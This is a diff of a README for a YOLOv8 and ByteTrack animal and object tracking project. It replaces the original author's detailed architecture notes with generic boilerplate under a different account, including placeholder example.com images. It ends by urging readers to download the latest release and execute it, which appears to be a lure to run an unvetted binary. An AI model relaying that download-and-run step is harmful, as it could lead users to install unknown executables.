@@ -1,132 +1,122 @@
-# multi-tracking-YOLOv8-ByteTrack
-# Cows/Animal Multi-Tracking with YOLOv8 and ByteTrack
+# Multi-Tracking YOLOv8 with ByteTrack 🚀
 
-## Demo
-This demo is a simple software that I created using my studies and courses. 
-Quem eu sou: https://luiz-amaral-portfolio.vercel.app/
+![YOLOv8](https://img.shields.io/badge/YOLOv8-Object%20Detection-brightgreen)
+![ByteTrack](https://img.shields.io/badge/ByteTrack-Multi%20Object%20Tracking-blue)
+![Python](https://img.shields.io/badge/Python-3.8%2B-yellowgreen)
 
-## Overview
-This software is designed for real-time object detection and tracking in video streams, using YOLO (You Only Look Once) for detection and ByteTrack for multi-object tracking. It is suitable for tracking objects in video footage, and can run on both GPU and CPU.
+Welcome to the **Multi-Tracking YOLOv8 with ByteTrack** repository! This project demonstrates real-time object detection and tracking using the powerful YOLOv8 model and ByteTrack algorithm. It is designed to track multiple objects in video streams, making it ideal for various applications, including animal tracking and security monitoring.
 
-**Key Features:**
-- Real-time video reading and frame buffering in a dedicated thread.
-- Asynchronous frame processing (detection + tracking) in a separate thread.
-- Uses YOLOv8 for object detection and ByteTrack for robust multi-object tracking.
-- Visualizes both detection and tracking results side-by-side.
-- Supports both GPU and CPU execution.
+## Table of Contents
 
----
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-## System Architecture
+## Introduction
 
-The system is built around two main threads:
+In the age of AI and computer vision, tracking objects in real-time is a critical task. This demo software leverages the latest advancements in deep learning to provide efficient and accurate tracking solutions. By combining YOLOv8 for detection and ByteTrack for tracking, this tool can process video streams effectively, whether on a CPU or GPU.
 
-1. **Video Reading Thread**  
-   - Reads frames from a video file.
-   - Stores the latest frame in a thread-safe singleton buffer.
+## Features
 
-2. **Processing Thread**  
-   - Waits for new frames.
-   - Runs YOLO object detection.
-   - Passes detections to ByteTrack for tracking.
-   - Draws detection and tracking results.
-   - Combines and displays the results.
+- **Real-Time Detection:** Utilize YOLOv8 for fast and accurate object detection.
+- **Multi-Object Tracking:** Track multiple objects simultaneously using ByteTrack.
+- **Flexible Hardware Support:** Run on both CPU and GPU, allowing for versatility in deployment.
+- **Easy to Use:** Simple setup and straightforward usage make it accessible for everyone.
+- **OpenCV Integration:** Use OpenCV for video handling and display.
 
-### Diagram
+## Installation
 
-```
-+-------------------+         +---------------------+         +---------------------+
-|                   |         |                     |         |                     |
-|  Video File/Camera| ---->   | Video Reading Thread| ---->   |  Frame Buffer       |
-|                   |         | (camera_video.py)   |         | (frames.py)         |
-+-------------------+         +---------------------+         +---------------------+
-                                                                      |
-                                                                      v
-                                                        +--------------------------+
-                                                        | Processing Thread        |
-                                                        | (processador.py)        |
-                                                        | - YOLO Detection        |
-                                                        | - ByteTrack Tracking    |
-                                                        | - Visualization         |
-                                                        +--------------------------+
-                                                                      |
-                                                                      v
-                                                        +--------------------------+
-                                                        |   Display/Output         |
-                                                        +--------------------------+
-```
+To get started, follow these steps to install the necessary dependencies:
 
----
+1. **Clone the Repository:**
 
-## Example Output
-
-Below is an example of the software in action. It shows ByteTrack tracking results (green boxes with IDs):
-
-![image](https://github.com/user-attachments/assets/c9d7b486-7a81-4d7c-89ae-cae611a620bf)
----
-
-## How It Works
-
-### 1. Video Reading (`camera/camera_video.py`)
-- A thread reads frames from a video file.
-- Each frame is stored in a singleton buffer (`Frames` class).
-- The reading thread can be stopped when the video ends or by user command.
-
-### 2. Frame Buffer (`camera/frames.py`)
-- Implements a thread-safe singleton to store and retrieve the latest frame.
-- Notifies the processing thread when a new frame is available.
-
-### 3. Processing (`core/processador.py`)
-- A separate thread waits for new frames.
-- Runs YOLOv8 for object detection (configurable for GPU/CPU).
-- Passes detections to ByteTrack for multi-object tracking.
-- Draws bounding boxes and tracking IDs.
-- Combines detection and tracking results for display.
-
-### 4. Visualization (`core/funcoes.py`)
-- Draws detection boxes (blue) and tracking boxes/IDs (green).
-- Shows object trajectories with colored lines.
-- Combines detection and tracking images side-by-side.
-
----
-
-## Running the Software
-
-1. **Install dependencies** (Python, OpenCV, Ultralytics YOLO, ByteTrack, etc.)
-2. **Place your video file** in the appropriate directory (default: `./apoio/cows3.mp4`).
-3. **Run `main.py`**:
+   ```bash
+   git clone https://github.com/Yghan31/multi-tracking-YOLOv8-ByteTrack.git
+   cd multi-tracking-YOLOv8-ByteTrack
    ```
-   python main.py
+
+2. **Install Required Packages:**
+
+   Make sure you have Python 3.8 or higher installed. Then, install the required packages using pip:
+
+   ```bash
+   pip install -r requirements.txt
    ```
-4. **Press `q`** to quit the visualization window.
 
----
+3. **Setup Environment:**
 
-## GPU/CPU Support
+   If you plan to run the software on a GPU, ensure you have the appropriate CUDA drivers installed. You can check your GPU compatibility on the [NVIDIA website](https://developer.nvidia.com/cuda-downloads).
 
-- The software automatically detects and uses GPU if available (see `utils.obter_cpu_gpu()`).
-- Falls back to CPU if no GPU is detected.
+## Usage
 
----
+To use the software, follow these steps:
 
-## File Structure
+1. **Prepare Your Video Stream:**
 
-```
-camera/
-  camera_video.py   # Video reading thread
-  frames.py         # Frame buffer (singleton)
-core/
-  processador.py    # Processing thread (YOLO + ByteTrack)
-  funcoes.py        # Helper functions for drawing, etc.
-main.py             # Entry point
-```
+   You can use a local video file or a live camera feed. Ensure that your video source is accessible.
 
----
+2. **Run the Application:**
 
+   Execute the following command in your terminal:
 
+   ```bash
+   python main.py --source <your_video_source>
+   ```
 
----
+   Replace `<your_video_source>` with the path to your video file or the camera index (e.g., `0` for the first camera).
+
+3. **View Results:**
+
+   The application will open a window displaying the video stream with detected and tracked objects. Press `q` to exit.
+
+## Examples
+
+Here are some examples of how the software performs in different scenarios:
+
+### Animal Tracking
+
+This software is perfect for tracking animals in various environments. You can set it up to monitor wildlife or pets in real-time.
+
+![Animal Tracking](https://example.com/animal_tracking_image.png)
+
+### Security Monitoring
+
+Use the tool for security purposes, tracking individuals or vehicles in a designated area.
+
+![Security Monitoring](https://example.com/security_monitoring_image.png)
+
+## Contributing
+
+Contributions are welcome! If you have suggestions or improvements, please feel free to fork the repository and submit a pull request. You can also open an issue if you encounter any bugs or have questions.
+
+### Steps to Contribute:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Submit a pull request to the main repository.
 
 ## License
 
-MIT License
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any questions or feedback, please reach out to me via GitHub or email.
+
+## Releases
+
+You can find the latest releases of the software [here](https://github.com/Yghan31/multi-tracking-YOLOv8-ByteTrack/releases). Download the latest version and execute it to experience the capabilities of this tool.
+
+Feel free to check the "Releases" section for updates and new features.
+
+---
+
+Thank you for exploring the **Multi-Tracking YOLOv8 with ByteTrack** project! I hope you find it useful for your applications.
